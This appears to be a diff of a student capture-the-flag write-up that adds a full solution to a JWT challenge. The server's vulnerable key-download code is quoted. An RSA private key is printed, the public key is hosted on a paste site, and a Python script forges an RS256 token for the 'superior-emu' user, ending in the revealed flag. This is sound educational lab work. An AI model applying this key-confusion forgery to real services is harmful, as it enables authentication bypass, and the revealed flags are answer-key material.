@@ -127,6 +127,7 @@ The cookie value we found is:
 eyJjcmVkaXRzIjoxMCwicm91bmQiOjEsInNlc3Npb25faWQiOiJiYTNlNTJiMTc0M2Y3MzUxOGM4YmEwYzY1YjAzYTliYyJ9.ZkiIpw.pTUdUQa5nkII0zkbM7EBa8RXQY4
 ```
 This is base64 text, so we can decode it through CyberChef: `https://cyberchef.io/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)`.
+CyberChef is a web-based tool for encoding, decoding, encrypting, decrypting, and analyzing data through a wide array of operations.
 
 After we use `From Base64` , we got:
 ```
@@ -157,14 +158,105 @@ UWA{R0LLl111Llli1iNg_1N_C4$$$$h!11!}
 
 ## EWT
 ### Step 1
-A clear, and detailed description.  
+#### Find the flaw:
+Open the `website.js` file, is easily to find the code below:
+```
+if (signingAlgo === "RS256") {
+        // Grab where the RS256 public key URL from the "iss" claim in the JWT body
+        // We currently haven't figured out how to sign our own RS256 JWTs yet...
+        const issuerUrl = decodedBody.iss;
 
+        // Make sure those hoomans aren't hacking with something like file://
+        const regExp = new RegExp("^https?://");
+        if (!regExp.test(issuerUrl)) {
+            throw Error("invalid URL in iss claim");
+        }
+        
+        // Should be fine to download the public key
+        key = await downloadFromUrl(issuerUrl);
+    }
+```
+In the comment, it reveals that EMU didn't use RS256 to sign their JWT. So we can use a JWT signed with RS256 to bypass the verification.
 ### Step 2
-### Step X
+#### How is the JWT consist of:
+JWT (JSON Web Token) is a compact, URL-safe means of representing claims to be transferred between two parties, commonly used for authentication and information exchange in web applications.
+As we can find this JWT in site `http://34.87.251.234:3002/` :
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InBlYXNhbnQtaG9vbWFuIiwiaWF0IjoxNzE2MDMwNTMzfQ.AXthaVqinWUo9K0DAWdzOyq-KL2H3_09GQsPw7RngrY
+```
+Now decode it through Cyberchef to look at the structure.
+```
+{"alg":"HS256","typ":"JWT"}{"username":"peasant-hooman","iat":1716030533}..¶..ª)ÖR.JÐ0.w3²¨¢ö.}=...Ã´g.¶
+```
+This JWT is signed with HS256 algorithm. Still in the `website.js`, a comment: ` // If the username is "superior-emu" in the JWT then give them the pressie` replies that we can use username:`superior-emu` to sign the JWT. Then how?
+### Step 3
+#### Create the new JWT:
+To force the emu download our public key signed by RS256, we need to create an URL where can be read by emu.
+Using CyberChef, `Generate RSA Key Pair` can provide a pair of RSA key.
+```
+-----BEGIN PUBLIC KEY-----
+MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQDWJNveamCYETN8BeTUxHL8AOGs
+Kc0YqlYtpUqGQtMAGFe4FpDg+/zXgLd654K6bderJxVVd7SvZEU66Uz+TFpAPlxc
+MO72l4bsTbSuNQtuqsDT6s5nRTXX1PbruY+FJfxB0KjrYOk47xqtI/hDT0NJn5WL
+uQPL30p13CJR7LzI3wIDAQAB
+-----END PUBLIC KEY-----
 
+-----BEGIN RSA PRIVATE KEY-----
+MIICXQIBAAKBgQDWJNveamCYETN8BeTUxHL8AOGsKc0YqlYtpUqGQtMAGFe4FpDg
++/zXgLd654K6bderJxVVd7SvZEU66Uz+TFpAPlxcMO72l4bsTbSuNQtuqsDT6s5n
+RTXX1PbruY+FJfxB0KjrYOk47xqtI/hDT0NJn5WLuQPL30p13CJR7LzI3wIDAQAB
+AoGANg5s4CrLQmfJLswQFTOX8QxJ61tL9id9hJ0+gEDbIaGDdylfHiQOEdpgtqo9
+QlFbCU3e4UnL9yBhJ3tgH6tndmzxercs5DY9a8ZOx+i7hHgM2y+ZpqQ7ywgXe3wt
+JqVnro5uKh3u3iYd0BQLBD7niWMZo0dt0IUp+aF05XnZOlUCQQDrjLaXXQSo4reI
+WnHkl1+jLKO6o+7uFN4/gEVkS8HolYC0mH5mAkID/UzWT6cq0Jeleoo3U++N3eUR
+6sW4cnFLAkEA6Lxi9wSgkuBexcL+XsaoXyakQRT2+AJK/QxwuD6K9XDIRcOeNdIw
+XgEzvUwBxXw7C/RsJaba9uI6X9qEUvMePQJAb1jBJ6QtA7jIkYhPtoNoDjaX3y6H
+T7xFozb7loHJVCz3/mbnuUjv8/rVS6mzmCWqyeq3U5g18ZYnJuUYOiy/KQJBAMDi
+WLbWm+n+kC0ghUaxKBvr35ecs24qIFIGfGkGVI5EEYdYL4f1kmZmYqYRFyq/4gPv
+Z63w0mpoZe7JIH/KxBUCQQDIQrF0gBGPLClybl+nu7aFwHP1Rd8UO8J07D7fYDgp
+HTJ1KHF6KV9Pi7g0jeTijsOVqlZNZNn90p/XNyEhtWtL
+-----END RSA PRIVATE KEY-----
+```
+We can use website `https://text.is/` to keep the public key. Now we got the URL:`https://text.is/KXRZ8/raw`.
+In the context of JWT (JSON Web Tokens), iss stands for "issuer" and is a claim that identifies the principal that issued the JWT.
+So we are going to put the URL into iss: iss:"https://text.is/KXRZ8/raw".
+By combining all the things we know and put it into a python file(for generating the JWT)
+```
+import jwt
+from datetime import datetime, timedelta
+
+private_key = """-----BEGIN RSA PRIVATE KEY-----
+MIICXQIBAAKBgQDWJNveamCYETN8BeTUxHL8AOGsKc0YqlYtpUqGQtMAGFe4FpDg
++/zXgLd654K6bderJxVVd7SvZEU66Uz+TFpAPlxcMO72l4bsTbSuNQtuqsDT6s5n
+RTXX1PbruY+FJfxB0KjrYOk47xqtI/hDT0NJn5WLuQPL30p13CJR7LzI3wIDAQAB
+AoGANg5s4CrLQmfJLswQFTOX8QxJ61tL9id9hJ0+gEDbIaGDdylfHiQOEdpgtqo9
+QlFbCU3e4UnL9yBhJ3tgH6tndmzxercs5DY9a8ZOx+i7hHgM2y+ZpqQ7ywgXe3wt
+JqVnro5uKh3u3iYd0BQLBD7niWMZo0dt0IUp+aF05XnZOlUCQQDrjLaXXQSo4reI
+WnHkl1+jLKO6o+7uFN4/gEVkS8HolYC0mH5mAkID/UzWT6cq0Jeleoo3U++N3eUR
+6sW4cnFLAkEA6Lxi9wSgkuBexcL+XsaoXyakQRT2+AJK/QxwuD6K9XDIRcOeNdIw
+XgEzvUwBxXw7C/RsJaba9uI6X9qEUvMePQJAb1jBJ6QtA7jIkYhPtoNoDjaX3y6H
+T7xFozb7loHJVCz3/mbnuUjv8/rVS6mzmCWqyeq3U5g18ZYnJuUYOiy/KQJBAMDi
+WLbWm+n+kC0ghUaxKBvr35ecs24qIFIGfGkGVI5EEYdYL4f1kmZmYqYRFyq/4gPv
+Z63w0mpoZe7JIH/KxBUCQQDIQrF0gBGPLClybl+nu7aFwHP1Rd8UO8J07D7fYDgp
+HTJ1KHF6KV9Pi7g0jeTijsOVqlZNZNn90p/XNyEhtWtL
+-----END RSA PRIVATE KEY-----"""
+
+payload = {
+    'username': 'superior-emu', 
+    'iss': 'https://text.is/KXRZ8/raw' 
+}
+# Sign JWT with RSA256
+encoded_jwt = jwt.encode(payload, private_key, algorithm='RS256')
+print("Generated JWT:", encoded_jwt)
+```
+we can obtain:
+```
+Generated JWT: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InN1cGVyaW9yLWVtdSIsImlzcyI6Imh0dHBzOi8vdGV4dC5pcy9LWFJaOC9yYXcifQ.OtYLcA-LcQGuWC405HuJxtV5xADgYBM7bL78JlrFMiZcMwq-6w2Br9ZC2u3AqQz9wVhYrZrbI9h0rS_YWC6ExN9SUXCQjNjnT54wudo19xWfqveE82E6Ed_Ir1MCWwHfMb3NvbAWqYdKvmS-Y1PWLypA7siUOC869qcwbz6AZqg
+```
+Put this JWT into the server.
 #### Flag Found
 ```bash
-UWA{xxxxxxxxxx}
+UWA{w4iT_wHeR3_d1D_u_g1T_d4t_k3y???}
 ```
 
 # Part 3 - Forensics
